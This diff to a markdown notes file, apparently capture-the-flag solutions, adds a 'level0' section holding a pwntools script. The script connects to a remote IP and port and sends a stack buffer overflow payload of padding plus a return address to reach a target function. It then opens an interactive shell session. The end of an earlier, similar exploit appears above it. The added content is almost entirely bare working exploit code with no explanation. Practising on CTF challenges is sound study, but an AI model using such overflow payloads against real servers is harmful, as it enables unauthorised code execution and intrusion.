@@ -58,6 +58,19 @@ p.recvuntil('bof')
 p.sendline(pay)
 p.interactive()
 ```
+
+# level0
+
+```python
+from pwn import *
+p=remote('111.198.29.45',51703)
+addr=0x400596
+pay='a'*(0x80+8)+p64(addr)
+p.sendline(pay)
+p.interactive()
+```
+
+# 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNDEyNDc0MjI1XX0=
+eyJoaXN0b3J5IjpbLTc0OTc5MzI4M119
 -->
